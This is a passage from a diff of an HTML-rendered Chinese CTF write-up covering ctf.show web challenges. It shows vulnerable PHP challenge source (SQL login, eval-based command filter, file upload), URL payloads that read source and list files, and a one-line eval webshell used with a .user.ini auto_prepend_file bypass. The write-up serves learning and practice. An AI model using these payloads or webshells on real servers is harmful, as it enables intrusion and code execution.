+		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">replaceSpecialChar</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sql inject error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">replaceSpecialChar</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sql inject error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+		<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from user where username = '<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span>
+		<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+					<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+						<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token operator">==</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+							<span class="token keyword">echo</span> <span class="token string double-quoted-string">"登陆成功&lt;br>"</span><span class="token punctuation">;</span>
+							<span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+						<span class="token punctuation">&#125;</span>
+
+					 <span class="token punctuation">&#125;</span>
+			<span class="token punctuation">&#125;</span>
+    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>解析</strong>：</p>
 <p>这段代码是一个简单的PHP登录验证示例，其原理是检查用户输入的用户名和密码是否存在于数据库中，并防止SQL注入攻击。</p>
 <ol type="1">
@@ -1131,8 +1113,7 @@ alt="web10_4" />
 <li><p><strong>keywords</strong></p>
 <p>session</p></li>
 <li><p>注意到</p>
-<div class="sourceCode" id="cb20"><pre
-class="sourceCode php"><code class="sourceCode php"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span>(<span class="va">$password</span><span class="op">==</span><span class="va">$_SESSION</span>[<span class="st">&#39;password&#39;</span>])</span></code></pre></div>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token operator">==</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><code>session</code>的password存储在本地，删除<img
 src="https://s2.loli.net/2023/05/19/FTxWSucVpiJDvKt.png"
 alt="s" /></p></li>
@@ -1147,7 +1128,7 @@ alt="s" /></p></li>
 <ol type="1">
 <li>注意<strong>;</strong></li>
 </ol>
-<pre class="url"><code>?cmd=phpinfo();</code></pre>
+<pre class="line-numbers language-uri" data-language="uri"><code class="language-uri"><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">cmd</span>=<span class="token value">phpinfo()</span></span><span class="token pair-delimiter">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <figure>
 <img src="https://s2.loli.net/2023/05/19/fX25xBDgZwouazj.png"
 alt="image-20230519015308143" />
@@ -1155,25 +1136,24 @@ alt="image-20230519015308143" />
 </figure>
 <ol start="2" type="1">
 <li><p>paylod</p>
-<pre class="url"><code>?cmd=highlight_file(&quot;index.php&quot;);</code></pre>
+<pre class="line-numbers language-uri" data-language="uri"><code class="language-uri"><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">cmd</span>=<span class="token value">highlight_file(</span></span></span>"index.php");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <figure>
 <img src="https://s2.loli.net/2023/05/19/oPVgn24tRuJ1Oh6.png"
 alt="image-20230519015828824" />
 <figcaption aria-hidden="true">image-20230519015828824</figcaption>
 </figure>
 <p><code>Global</code>函数</p>
-<div class="sourceCode" id="cb23"><pre
-class="sourceCode php"><code class="sourceCode php"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="fu">glob</span>(<span class="st">&quot;*&quot;</span>) 匹配任意文件</span>
-<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="fu">glob</span>(<span class="st">&quot;*.txt&quot;</span>)匹配以txt为后缀的文件</span></code></pre></div>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">glob</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"*"</span><span class="token punctuation">)</span> 匹配任意文件
+<span class="token function">glob</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"*.txt"</span><span class="token punctuation">)</span>匹配以txt为后缀的文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><strong>payload</strong></p>
-<pre class="url"><code>?cmd=print_r(glob(&quot;*&quot;));</code></pre>
+<pre class="line-numbers language-uri" data-language="uri"><code class="language-uri"><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">cmd</span>=<span class="token value">print_r(glob(</span></span></span>"*"));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <figure>
 <img src="https://s2.loli.net/2023/05/19/F5ksnci37muDTGK.png"
 alt="image-20230519020418592" />
 <figcaption aria-hidden="true">image-20230519020418592</figcaption>
 </figure></li>
 <li><p>payload</p>
-<pre class="url"><code>?cmd=highlight_file(&quot;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&quot;);</code></pre>
+<pre class="line-numbers language-uri" data-language="uri"><code class="language-uri"><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">cmd</span>=<span class="token value">highlight_file(</span></span></span>"903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <figure>
 <img src="https://s2.loli.net/2023/05/19/1F96CpngIavtkZi.png"
 alt="image-20230519020207932" />
@@ -1209,21 +1189,20 @@ Linux 和类 Unix
 </ul></li>
 </ol></li>
 <li><p>Code</p>
-<div class="sourceCode" id="cb26"><pre
-class="sourceCode php"><code class="sourceCode php"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a>  <span class="op">&lt;</span><span class="ot">?</span>php</span>
-<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> (<span class="kw">isset</span>(<span class="va">$_GET</span>[<span class="st">&#39;cmd&#39;</span>])) &#123;</span>
-<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a>    <span class="va">$cmd</span> <span class="op">=</span> <span class="va">$_GET</span>[<span class="st">&#39;cmd&#39;</span>]<span class="ot">;</span></span>
-<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a>    <span class="fu">highlight_file</span>(<span class="cn">__FILE__</span>)<span class="ot">;</span></span>
-<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (<span class="fu">preg_match</span>(<span class="st">&quot;/[A-Za-oq-z0-9$]+/&quot;</span><span class="ot">,</span> <span class="va">$cmd</span>)) &#123;</span>
-<span id="cb26-6"><a href="#cb26-6" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb26-7"><a href="#cb26-7" aria-hidden="true" tabindex="-1"></a>      <span class="cf">die</span>(<span class="st">&quot;cerror&quot;</span>)<span class="ot">;</span></span>
-<span id="cb26-8"><a href="#cb26-8" aria-hidden="true" tabindex="-1"></a>    &#125;</span>
-<span id="cb26-9"><a href="#cb26-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (<span class="fu">preg_match</span>(<span class="st">&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#39;|</span><span class="sc">\&quot;</span><span class="st">|\:|\,/&quot;</span><span class="ot">,</span> <span class="va">$cmd</span>)) &#123;</span>
-<span id="cb26-10"><a href="#cb26-10" aria-hidden="true" tabindex="-1"></a>      <span class="cf">die</span>(<span class="st">&quot;serror&quot;</span>)<span class="ot">;</span></span>
-<span id="cb26-11"><a href="#cb26-11" aria-hidden="true" tabindex="-1"></a>    &#125;</span>
-<span id="cb26-12"><a href="#cb26-12" aria-hidden="true" tabindex="-1"></a>    <span class="kw">eval</span>(<span class="va">$cmd</span>)<span class="ot">;</span></span>
-<span id="cb26-13"><a href="#cb26-13" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb26-14"><a href="#cb26-14" aria-hidden="true" tabindex="-1"></a>  &#125;</span></code></pre></div>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[A-Za-oq-z0-9$]+/"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+   
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cerror"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\'|\"|\:|\,/"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"serror"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <ul>
 <li><p><code>eval()</code> 是一个 PHP 函数，用于执行传递给它的字符串作为
 PHP 代码。它将字符串解析为可执行的 PHP
@@ -1250,40 +1229,38 @@ alt="image-20230520225711139" />再次使用
 <p>upload.php.bak<strong>|</strong>.hg<strong>|</strong>
 .git<strong>|</strong> .DS_Store文件泄漏<strong>|</strong>.phps
 .bak结尾的网页</p>
-<div class="sourceCode" id="cb27"><pre
-class="sourceCode python"><code class="sourceCode python"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a>https:<span class="op">//</span><span class="dv">3</span><span class="er">d2fad8a</span><span class="op">-</span><span class="dv">33</span><span class="er">c2</span><span class="op">-</span><span class="dv">4372</span><span class="op">-</span><span class="dv">9</span><span class="er">d18</span><span class="op">-</span><span class="dv">4</span><span class="er">b277330cc2a</span>.challenge.ctf.show<span class="op">/</span>upload.php.bak</span></code></pre></div>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">https<span class="token punctuation">:</span><span class="token operator">//</span>3d2fad8a<span class="token operator">-</span>33c2<span class="token operator">-</span><span class="token number">4372</span><span class="token operator">-</span>9d18<span class="token operator">-</span>4b277330cc2a<span class="token punctuation">.</span>challenge<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>show<span class="token operator">/</span>upload<span class="token punctuation">.</span>php<span class="token punctuation">.</span>bak<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>下载源文件</p>
-<div class="sourceCode" id="cb28"><pre
-class="sourceCode php"><code class="sourceCode php"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span> </span>
-<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a> <span class="fu">header</span>(<span class="st">&quot;content-type:text/html;charset=utf-8&quot;</span>)<span class="ot">;</span></span>
-<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a> <span class="va">$filename</span> <span class="op">=</span> <span class="va">$_FILES</span>[<span class="st">&#39;file&#39;</span>][<span class="st">&#39;name&#39;</span>]<span class="ot">;</span></span>
-<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a> <span class="va">$temp_name</span> <span class="op">=</span> <span class="va">$_FILES</span>[<span class="st">&#39;file&#39;</span>][<span class="st">&#39;tmp_name&#39;</span>]<span class="ot">;</span></span>
-<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a> <span class="va">$size</span> <span class="op">=</span> <span class="va">$_FILES</span>[<span class="st">&#39;file&#39;</span>][<span class="st">&#39;size&#39;</span>]<span class="ot">;</span></span>
-<span id="cb28-6"><a href="#cb28-6" aria-hidden="true" tabindex="-1"></a> <span class="va">$error</span> <span class="op">=</span> <span class="va">$_FILES</span>[<span class="st">&#39;file&#39;</span>][<span class="st">&#39;error&#39;</span>]<span class="ot">;</span></span>
-<span id="cb28-7"><a href="#cb28-7" aria-hidden="true" tabindex="-1"></a> <span class="va">$arr</span> <span class="op">=</span> <span class="fu">pathinfo</span>(<span class="va">$filename</span>)<span class="ot">;</span></span>
-<span id="cb28-8"><a href="#cb28-8" aria-hidden="true" tabindex="-1"></a> <span class="va">$ext_suffix</span> <span class="op">=</span> <span class="va">$arr</span>[<span class="st">&#39;extension&#39;</span>]<span class="ot">;</span></span>
-<span id="cb28-9"><a href="#cb28-9" aria-hidden="true" tabindex="-1"></a> <span class="cf">if</span> (<span class="va">$size</span> <span class="op">&gt;</span> <span class="dv">24</span>)&#123;</span>
-<span id="cb28-10"><a href="#cb28-10" aria-hidden="true" tabindex="-1"></a>     <span class="cf">die</span>(<span class="st">&quot;error file zise&quot;</span>)<span class="ot">;</span></span>
-<span id="cb28-11"><a href="#cb28-11" aria-hidden="true" tabindex="-1"></a> &#125;</span>
-<span id="cb28-12"><a href="#cb28-12" aria-hidden="true" tabindex="-1"></a> <span class="cf">if</span> (<span class="fu">strlen</span>(<span class="va">$filename</span>)<span class="op">&gt;</span><span class="dv">9</span>)&#123;</span>
-<span id="cb28-13"><a href="#cb28-13" aria-hidden="true" tabindex="-1"></a>     <span class="cf">die</span>(<span class="st">&quot;error file name&quot;</span>)<span class="ot">;</span></span>
-<span id="cb28-14"><a href="#cb28-14" aria-hidden="true" tabindex="-1"></a> &#125;</span>
-<span id="cb28-15"><a href="#cb28-15" aria-hidden="true" tabindex="-1"></a> <span class="cf">if</span>(<span class="fu">strlen</span>(<span class="va">$ext_suffix</span>)<span class="op">&gt;</span><span class="dv">3</span>)&#123;</span>
-<span id="cb28-16"><a href="#cb28-16" aria-hidden="true" tabindex="-1"></a>     <span class="cf">die</span>(<span class="st">&quot;error suffix&quot;</span>)<span class="ot">;</span></span>
-<span id="cb28-17"><a href="#cb28-17" aria-hidden="true" tabindex="-1"></a> &#125;</span>
-<span id="cb28-18"><a href="#cb28-18" aria-hidden="true" tabindex="-1"></a> <span class="cf">if</span>(<span class="fu">preg_match</span>(<span class="st">&quot;/php/i&quot;</span><span class="ot">,</span><span class="va">$ext_suffix</span>))&#123;</span>
-<span id="cb28-19"><a href="#cb28-19" aria-hidden="true" tabindex="-1"></a>     <span class="cf">die</span>(<span class="st">&quot;error suffix&quot;</span>)<span class="ot">;</span></span>
-<span id="cb28-20"><a href="#cb28-20" aria-hidden="true" tabindex="-1"></a>    &#125;</span>
-<span id="cb28-21"><a href="#cb28-21" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span>(<span class="fu">preg_match</span>(<span class="st">&quot;/php/i&quot;</span>)<span class="ot">,</span><span class="va">$filename</span>))&#123;</span>
-<span id="cb28-22"><a href="#cb28-22" aria-hidden="true" tabindex="-1"></a>        <span class="cf">die</span>(<span class="st">&quot;error file name&quot;</span>)<span class="ot">;</span></span>
-<span id="cb28-23"><a href="#cb28-23" aria-hidden="true" tabindex="-1"></a>    &#125;</span>
-<span id="cb28-24"><a href="#cb28-24" aria-hidden="true" tabindex="-1"></a> <span class="cf">if</span> (<span class="fu">move_uploaded_file</span>(<span class="va">$temp_name</span><span class="ot">,</span> <span class="st">&#39;./&#39;</span><span class="op">.</span><span class="va">$filename</span>))&#123;</span>
-<span id="cb28-25"><a href="#cb28-25" aria-hidden="true" tabindex="-1"></a>     <span class="kw">echo</span> <span class="st">&quot;文件上传成功！&quot;</span><span class="ot">;</span></span>
-<span id="cb28-26"><a href="#cb28-26" aria-hidden="true" tabindex="-1"></a> &#125;<span class="cf">else</span>&#123;</span>
-<span id="cb28-27"><a href="#cb28-27" aria-hidden="true" tabindex="-1"></a>     <span class="kw">echo</span> <span class="st">&quot;文件上传失败！&quot;</span><span class="ot">;</span></span>
-<span id="cb28-28"><a href="#cb28-28" aria-hidden="true" tabindex="-1"></a> &#125;</span>
-<span id="cb28-29"><a href="#cb28-29" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb28-30"><a href="#cb28-30" aria-hidden="true" tabindex="-1"></a> <span class="kw">?&gt;</span></span></code></pre></div>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+	<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token variable">$temp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token variable">$size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token variable">$error</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$ext_suffix</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span> <span class="token operator">></span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error file zise"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error file name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$ext_suffix</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error suffix"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/php/i"</span><span class="token punctuation">,</span><span class="token variable">$ext_suffix</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error suffix"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/php/i"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error file name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'./'</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件上传成功！"</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件上传失败！"</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+
+ <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>解析：</strong></p>
 <p>我们发现了上传文件的要求，文件的大小要小于等于24，名字长度小于等于9，后缀长度小于等于3，并且最要命的是后缀和名字都不能包含php。我们肯定是要上传一句话木马的，既然小于等于24可以这样写<code>&lt;?php eval($_POST['a']);</code>正好24字节可以满足，但是由于后缀问题服务器无法解析该php语句</p></li>
 <li><p><strong>策略</strong></p>
@@ -1296,10 +1273,10 @@ class="sourceCode php"><code class="sourceCode php"><span id="cb28-1"><a href="#
 不会搜寻。也就是在.usr.ini中如果设置了文件名，那么任意一个页面都会将该文件中的内容包含进去。
 我们在.usr.ini中输入<code>auto_prepend_file =a.txt</code>，这样在该目录下的所有文件都会包含a.txt的内容。</p></li>
 <li><p>payload</p>
-<div class="sourceCode" id="cb29"><pre
-class="sourceCode php"><code class="sourceCode php"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="co">// 1.  我失败</span></span>
-<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a>upload<span class="op">.</span>php<span class="op">/</span><span class="ot">?</span>a<span class="op">=</span><span class="fu">print_r</span>(<span class="fu">glob</span>(<span class="st">&quot;*&quot;</span>))<span class="ot">;</span></span>
-<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a><span class="co">// 2.</span></span></code></pre></div></li>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 1.  我失败</span>
+upload<span class="token operator">.</span>php<span class="token operator">/</span><span class="token operator">?</span>a<span class="token operator">=</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// 2.</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
 </ol></li>
 </ol>
 <h4 id="web14sql注入">Web14：sql注入</h4>
@@ -1331,82 +1308,81 @@ alt="image-20230521033835753" /></p></li>
 <ol type="1">
 <li><p>得到 <code>web.zip</code></p></li>
 <li><p>解压得到<strong>check.php</strong></p>
-<div class="sourceCode" id="cb30"><pre
-class="sourceCode php"><code class="sourceCode php"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
-<span id="cb30-2"><a href="#cb30-2" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> receiveStreamFile(<span class="va">$receiveFile</span>)&#123;</span>
-<span id="cb30-3"><a href="#cb30-3" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb30-4"><a href="#cb30-4" aria-hidden="true" tabindex="-1"></a><span class="va">$streamData</span> <span class="op">=</span> <span class="kw">isset</span>(<span class="va">$GLOBALS</span>[<span class="st">&#39;HTTP_RAW_POST_DATA&#39;</span>])<span class="ot">?</span> <span class="va">$GLOBALS</span>[<span class="st">&#39;HTTP_RAW_POST_DATA&#39;</span>] <span class="ot">:</span> <span class="st">&#39;&#39;</span><span class="ot">;</span></span>
-<span id="cb30-5"><a href="#cb30-5" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb30-6"><a href="#cb30-6" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span>(<span class="kw">empty</span>(<span class="va">$streamData</span>))&#123;</span>
-<span id="cb30-7"><a href="#cb30-7" aria-hidden="true" tabindex="-1"></a><span class="va">$streamData</span> <span class="op">=</span> <span class="fu">file_get_contents</span>(<span class="st">&#39;php://input&#39;</span>)<span class="ot">;</span></span>
-<span id="cb30-8"><a href="#cb30-8" aria-hidden="true" tabindex="-1"></a>&#125;</span>
-<span id="cb30-9"><a href="#cb30-9" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb30-10"><a href="#cb30-10" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span>(<span class="va">$streamData</span><span class="op">!=</span><span class="st">&#39;&#39;</span>)&#123;</span>
-<span id="cb30-11"><a href="#cb30-11" aria-hidden="true" tabindex="-1"></a><span class="va">$ret</span> <span class="op">=</span> <span class="fu">file_put_contents</span>(<span class="va">$receiveFile</span><span class="ot">,</span> <span class="va">$streamData</span><span class="ot">,</span> <span class="kw">true</span>)<span class="ot">;</span></span>
-<span id="cb30-12"><a href="#cb30-12" aria-hidden="true" tabindex="-1"></a>&#125;<span class="cf">else</span>&#123;</span>
-<span id="cb30-13"><a href="#cb30-13" aria-hidden="true" tabindex="-1"></a><span class="va">$ret</span> <span class="op">=</span> <span class="kw">false</span><span class="ot">;</span></span>
-<span id="cb30-14"><a href="#cb30-14" aria-hidden="true" tabindex="-1"></a>&#125;</span>
-<span id="cb30-15"><a href="#cb30-15" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb30-16"><a href="#cb30-16" aria-hidden="true" tabindex="-1"></a><span class="cf">return</span> <span class="va">$ret</span><span class="ot">;</span></span>
